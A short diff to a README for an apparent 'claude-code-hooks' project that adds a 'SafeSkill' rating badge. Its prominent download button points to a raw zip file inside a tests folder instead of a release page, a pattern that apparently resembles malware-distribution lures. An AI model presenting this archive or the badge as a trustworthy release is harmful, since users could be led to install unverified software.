@@ -1,5 +1,7 @@
 # 🪝 claude-code-hooks - Unlock Your Automation Potential Easily
 
+[![SafeSkill 84/100](https://img.shields.io/badge/SafeSkill-84%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/gabrielcostalopes16-claude-code-hooks)
+
 [![Download Latest Release](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip+Release&color=blue)](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip)
 
 ## 🚀 Getting Started
